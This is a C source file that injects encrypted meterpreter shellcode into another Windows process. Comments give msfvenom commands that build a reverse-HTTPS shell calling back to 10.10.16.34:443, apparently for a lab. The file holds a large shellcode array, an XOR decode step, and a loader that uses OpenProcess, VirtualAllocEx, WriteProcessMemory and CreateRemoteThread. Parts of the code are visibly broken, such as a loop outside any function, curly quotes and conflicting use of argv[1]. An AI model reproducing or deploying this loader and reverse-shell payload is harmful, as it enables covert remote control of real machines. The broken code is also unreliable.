#include “stdafx.h”
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define EXIT_WITH_ERROR( e ) { printf( “%s – %d”, e, GetLastError() );return 1;}

//https://resources.infosecinstitute.com/topic/poor-mans-process-migration-windows/


//msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=10.10.16.34 LPORT=443 HandlerSSLCert=/root/rastalabs/msf.pem StagerVerifySSLCert=true -f psh-net -o 443.ps1

//msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=10.10.16.34 LPORT=443 --encoder x64/xor --encrypt-iv HandlerSSLCert=/root/rastalabs/msf.pem  --encrypt xor --encrypt-key Y -f c


unsigned char buf[] =
"\x11\x68\x90\x11\xd8\xb0\x2f\xa6\xa6\xa6\x11\xd4\x5c\xb6\xa6"
"\xa6\xa6\x11\xe2\x6a\xca\xe1\xf0\xd5\x86\x2f\x5c\x11\x68\x01"
"\x7e\x11\x74\xa1\xa6\xa6\xa6\xbb\xad\x96\x82\x62\x14\x25\x6e"
"\xe3\x5c\x6a\xca\xa0\xa1\x94\xd6\x7d\x14\x5b\x18\xb0\x95\x9d"
"\x0d\x7d\x3c\x3c\x82\x6a\xa2\xcd\xce\xa4\x0e\x4a\x82\x6a\x82"
"\x85\xce\x20\xeb\x20\x80\xac\xc1\x1c\xce\x1e\x9c\xc6\xf6\x80"
"\x8c\xd7\xaa\x0f\x1d\xab\x03\xec\xb1\xd4\x47\xcd\xb1\x38\x82"
"\x6a\xa2\xf5\x0d\x6d\x60\x2b\x9b\xa9\xf1\x05\xe0\xae\x24\x72"
"\xc1\xe3\xff\x50\xf4\x2f\x5c\x6a\x41\x61\x78\xd5\x86\x2f\x14"
"\xef\x0a\x95\x97\x9d\x87\xff\x18\xe1\x8a\xc1\xb9\xd4\x56\xa4"
"\x14\x72\x9a\x02\xa6\x98\xb7\xe6\x14\x95\x03\xa0\x7b\xe1\x0e"
"\x67\x5d\xbc\x82\xd0\x30\x79\xc7\xee\x95\x67\x8b\xe0\x31\xed"
"\x66\x5a\xad\x26\xc9\xad\xd4\xdd\xc3\x16\x8d\x1f\x12\xb9\xb4"
"\x5e\xc6\x0b\x15\x6b\x1a\x87\xb1\x5e\x8a\x67\x18\xe1\x8a\xfd"
"\xb9\xd4\x56\x6e\xd7\x6e\x42\xa0\xa8\x94\xde\x71\x05\x22\xcb"
"\x31\xaa\x94\xde\x6e\x05\x2b\x90\xa9\x73\x39\xa6\x6e\x0e\x95"
"\x2a\xb9\xb1\x8c\xdc\x67\xd7\x78\x23\xaa\x0f\x2a\x79\x72\x14"
"\x5b\x11\xb2\xb9\x6b\xf1\x46\x32\x02\xbe\x95\x80\xd5\xc7\x79"
"\x14\xe3\x2b\xa8\x37\x17\xca\x58\x7a\x6d\x35\x34\xa3\x86\xce"
"\xa6\xbd\x39\x90\xac\xc1\x15\xcb\x1e\x95\x39\x99\xa8\x4a\xd1"
"\x99\xb2\xe7\x6a\xca\xe1\xf0\x2a\x53\x66\xd5\xae\x22\xf9\xf0"
"\xd5\x86\x1e\x5c\x5a\xca\xcf\xf0\xe4\x86\x1f\x5c\x44\xca\xd0"
"\xf0\xe3\x86\x01\x5c\x59\xca\xd5\xf0\xd5\x86\x75\x14\xe3\x0b"
"\xa8\x37\x15\x3d\x2e\x5c\x6a\x87\xd0\x39\x9c\x3c\x69\xc7\x74"
"\x08\xe1\xf0\xd5\x86\xd0\x89\x82\x40\xe0\xf0\xd5\xee\x2f\x28"
"\x6a\xbe\xe1\x80\xd5\xf5\x2f\x66\x6a\xe5\xe1\xdf\xd5\xb7\x2f"
"\x6c\x6a\xe4\xe1\xc1\xd5\xb6\x2f\x72\x6a\xfb\xe1\xc6\xd5\xa8"
"\x2f\x6f\x6a\xfe\xe1\xdf\xd5\xd5\x2f\x6e\x6a\xfa\xe1\x9a\xd5"
"\xfe\x2f\x16\x6a\x8c\xe1\xba\xd5\xde\x2f\x2a\x6a\xab\xe1\x86"
"\xd5\xd6\x2f\x2d\x6a\xfe\xe1\xc8\xd5\xfc\x2f\x68\x6a\xbb\xe1"
"\x98\xd5\xdc\x2f\x2b\x6a\x83\xe1\xa3\xd5\xe3\x2f\x2f\x6a\xff"
"\xe1\xc3\xd5\xee\x2f\x03\x6a\xa9\xe1\xa3\xd5\xd1\x2f\x65\x6a"
"\xa5\xe1\xc2\xd5\xde\x2f\x2d\x6a\xb9\xe1\xc3\xd5\xc0\x2f\x64"
"\x6a\xfc\xe1\xc3\xd5\xd1\x2f\x09\x6a\xbf\xe1\x9e\xd5\xde\x2f"
"\x68\x6a\x9f\xe1\x92\xd5\xef\x2f\x35\x6a\xa3\xe1\xbc\xd5\xb1"
"\x2f\x37\x6a\x8c\xe1\xbe\xd5\xe2\x2f\x0e\x6a\x99\xe1\xb4\xd5"
"\xf6\x2f\x71\x6a\xa9\xe1\xc8\xd5\xd9\x2f\x2b\x6a\xae\xe1\xb1"
"\xd5\xe5\x2f\x26\x6a\xb0\xe1\xbf\xd5\xd4\x2f\x06\x6a\x9f\xe1"
"\xbc\xd5\xd4\x2f\x12\x6a\xaf\xe1\xbe\xd5\xb5\x2f\x3e\x6a\xfe"
"\xe1\x9a\xd5\xd0\x2f\x36\x6a\x84\xe1\x81\xd5\xce\x2f\x6e\x6a"
"\xa2\xe1\xb3\xd5\xf6\x2f\x2f\x6a\x8c\xe1\x8a\xd5\xe1\x2f\x1e"
"\x6a\xa6\xe1\x94\xd5\xb3\x2f\x2b\x6a\xbd\xe1\xb5\xd5\xd9\x2f"
"\x16\x6a\x87\xe1\x9d\xd5\xc5\x2f\x65\x6a\xa7\xe1\x98\xd5\xd6"
"\x2f\x05\x6a\xb9\xe1\xaa\xd5\xb6\x2f\x6b\x6a\x8d\xe1\x96\xd5"
"\xf7\x2f\x17\x6a\x8b\xe1\xbf\xd5\xee\x2f\x1b\x6a\x93\xe1\x99"
"\xd5\xe5\x2f\x37\x6a\xfd\xe1\x89\xd5\xd3\x2f\x18\x6a\xaf\xe1"
"\x96\xd5\xcb\x2f\x1b\x6a\xab\xe1\xbf\xd5\xb1\x2f\x30\x6a\x8d"
"\xe1\xa7\xd5\xe0\x2f\x64\x6a\xba\xe1\xbd\xd5\xea\x2f\x39\x6a"
"\xbb\xe1\xc6\xd5\xcf\x2f\x16\x6a\xac\xe1\xb9\xd5\xb2\x2f\x64"
"\x6a\xbc\xe1\x95\xd5\xc7\x2f\x38\x6a\xaf\xe1\xb2\xd5\xf4\x2f"
"\x0e\x6a\xe7\xe1\x89\xd5\xc0\x2f\x39\x6a\x82\xe1\xba\xd5\x86"
"\x2f\x14\xe3\x0b\xb2\xaa\x94\xde\x62\xd5\xaf\x83\x62\x30\xf3"
"\xcb\x1e\x95\x39\x82\x26\x30\xd5\x87\xaf\x5c\x3a\x99\xb2\xb9"
"\x12\x44\xb7\x4c\xd9\x91\x1e\x25\x9d\x0f\xe9\x14\xe9\x22\xc1"
"\xb8\x5c\x61\x67\xd5\x93\x83\x26\x32\xf4\x21\x24\x3c\x95\x1f"
"\x64\x30\xda\x02\x42\x5c\x6a\xca\xa9\x7b\x92\x8e\xaa\x9c\x1e"
"\xf0\xa9\x79\x0c\xce\xd0\x9d\x22\x0b\x00\xd0\x84\xd5\x7f\x14"
"\xd2\xc9\xe1\xf0\xd5\x85\x2f\x5c\x6a\x9a\xa8\x79\x35\xce\xac"
"\xb0\x4a\x82\x68\x17\x9c\x0f\xd6\x10\xe3\x2b\xad\x79\x3f\xcf"
"\xe8\x9e\xb0\x17\x0b\xb9\x2a\x53\xaa\x9c\x1e\xe7\x0a\xe2\x9d"
"\x0d\x68\x4c\xef\x0a\x95\xd3\x9d\x05\xe8\x54\x00\xc9\xb9\xb8"
"\x5c\x81\x66\xd5\x92\xa0\xf9\xb1\x8c\xce\xa6\xad\x00\xec\xbb"
"\xb9\x6f\x55\x77\xc1\xa4\xca\xe1\xf0\xd5\x79\xfa\x36\x60\x95"
"\xa9\x79\x24\xec\x30\x06\x38\xa2\xe1\xc3\xd5\x86\x66\xd5\x8a"
"\xa0\xe5\xb1\x8c\xcf\x95\x8f\x32\x57\x2f\xf0\xd5\x86\x2f\xa3"
"\xbf\x87\xd0\x30\x86\xdc\x67\xd5\x9b\x87\xd0\x39\x86\xd5\x7c"
"\x0f\x23\x70\x74\xa8\x6e\x17\x2f\x5c\x6a\xca\x1e\x25\x50\x46"
"\x5a\x50\x22\x35\x2e\x84\xd7\x6d\x94\xb4\x02\xca\xe1\xf0\x9d"
"\x0f\xde\x0f\x30\x83\x26\x32\xd0\x0e\xb2\x2c\x95\x1f\x64\x30"
"\xa1\x6f\x7c\x05\x00\x8a\xbb\xb9\x5c\x57\xee\xbe\x7a\x83\x26"
"\x30\xd5\x96\x2f\x5c\x23\x70\xb9\x54\x86\x63\x2f\x5c\x6a\xca"
"\x1e\x25\x9d\x15\x7c\x0f\x22\x43\x06\xb8\x5c\x77\x67\xd5\xb0"
"\x83\x26\x30\xd5\xa6\x2f\x5c\x23\x43\x18\xb9\x12\x44\x43\x75"
"\x4e\xb4\x1e\x25\x9d\x05\xeb\x7c\xef\x0a\xee\x74\x4a\x79\xd0"
"\xa3\x0c\x41\xe6\xb8\xd4\x45\xaa\x9c\x1f\x1b\xb9\x33\x8d\xec"
"\x2f\x05\x23\x0d\x23\x00\x60\x24\x79\xa3\xbf\xca\xe1\xf0\xd5"
"\x86\x2f\x5c";


char shellcode[sizeof(buf)];
for(int i=0;i<sizeof(buf);i++)

shellcode[i]=buf[i]^argv[1][0];


int main(int argc, char * argv[])
{
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    LPVOID lpBuffer = NULL;
    DWORD dwProcessId = 0;
    int iSize;
    dwProcessId = atoi(argv[1]);
	
SIZE_T lpnumber = 0;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess)
        EXIT_WITH_ERROR(“Failed to open the target process”);
    iSize = sizeof(shellcode);
    printf(“iSize=%dn”, iSize);
    LPVOID vptr = (int *)VirtualAllocEx(hProcess, NULL, iSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BOOL b = WriteProcessMemory(hProcess, vptr, shellcode, iSize, &lpnumber);
    printf(“WriteProcessResult:%d %lpnumber=%d %dn”, b, lpnumber);
    HANDLE h = CreateRemoteThread(hProcess, NULL,0,(LPTHREAD_START_ROUTINE)vptr, NULL, 0, 0);

    if (h == NULL)
        {
            EXIT_WITH_ERROR(“Failed to execute shellcode);
        }
    return 0;
}
